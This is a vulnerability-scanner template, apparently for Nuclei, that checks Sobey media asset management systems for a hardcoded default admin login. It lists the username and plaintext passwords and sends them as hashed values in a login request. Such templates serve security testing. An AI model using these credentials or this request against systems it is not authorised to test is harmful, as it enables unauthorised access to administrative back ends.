id: sobey-default-login

info:
  name: Sobey - Default Login
  author: qwtd
  severity: high
  description: |
    索贝融媒体存在硬编码漏洞，导致默认密码泄露造成的后台管理系统的非法利用。
    用户名为sobey密码为sobey|Sobeyhive-2016
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%88%90%E9%83%BD%E7%B4%A2%E8%B4%9D%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80/%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93%E5%AD%98%E5%9C%A8%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E.md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: 索贝融媒体资产管理系统

http:
  - raw:
      - |
        POST /user/login?r=51731215789618 HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Cookie: lang=zh
        Content-Type: application/json;charset=UTF-8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        mam-product: mah
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Content-Length: 67

        {"loginName":"sobey","password":"{{password}}"}

    payloads:
      password:
        - aed659d2bf7ac428d714731de5f55ed0
        - 2ffc14b6e2f9f699a3addc90d9bae15a
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "requestId"
          - '"success":true'
          - 'hostId'
        part: body
        condition: and

      - type: status
        status:
          - 200
